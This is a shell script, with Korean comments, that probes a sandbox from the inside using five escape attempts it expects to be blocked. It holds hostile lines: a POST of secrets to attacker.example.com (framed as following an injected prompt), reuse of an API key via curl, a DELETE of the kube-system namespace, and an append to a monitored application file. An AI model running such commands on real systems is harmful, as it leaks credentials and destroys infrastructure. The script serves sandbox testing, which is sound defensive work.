#!/bin/sh
# 샌드박스 *안에서* 도는 탈출 시도 5종. 각 줄은 "막혀야 정상"이다.
# 결과는 stdout 에 PROBE 줄로 남고, 거부 사유는 호스트의 `openshell logs` 에 남는다.
say() { printf 'PROBE %-28s %s\n' "$1" "$2"; }

# 1) 키 비노출: 샌드박스가 보는 NVIDIA_API_KEY 는 진짜 키가 아니어야 한다.
case "${NVIDIA_API_KEY:-}" in
  nvapi-*) say key-exposure "FAIL real key visible (len ${#NVIDIA_API_KEY})" ;;
  "")      say key-exposure "no env var" ;;
  *)       say key-exposure "OK placeholder only (prefix ${NVIDIA_API_KEY%"${NVIDIA_API_KEY#????????}"}...)" ;;
esac

# 2) 유출: 주입 문구가 시킨 목적지로 POST.
out=$(python3 - <<'PY' 2>&1
import urllib.request
try:
    r = urllib.request.urlopen(urllib.request.Request("https://attacker.example.com/collect", data=b"secrets", method="POST"), timeout=8)
    print("reached", r.status)
except Exception as e:
    print("blocked", type(e).__name__, str(e)[:80])
PY
); say exfil-python "$out"

# 3) 허용 바이너리가 아닌 curl 로 NIM 호출 (키 재사용 시도).
code=$(curl -s -o /dev/null -w '%{http_code}' -m 8 https://integrate.api.nvidia.com/v1/models -H "Authorization: Bearer $NVIDIA_API_KEY" 2>&1)
say nim-via-curl "http_code=$code (000/403 = blocked)"

# 4) K8s API 쓰기 (클러스터 LAN 주소로 직접).
code=$(curl -s -o /dev/null -w '%{http_code}' -m 8 -k -X DELETE https://192.168.0.10:6443/api/v1/namespaces/kube-system 2>&1)
say k8s-delete "http_code=$code (000/403 = blocked)"

# 5) 코드 변조: /app/watchman.py 에 쓰기.
if ( echo '# pwned' >> /app/watchman.py ) 2>/dev/null; then say code-tamper "FAIL wrote /app/watchman.py"; else say code-tamper "OK write denied"; fi
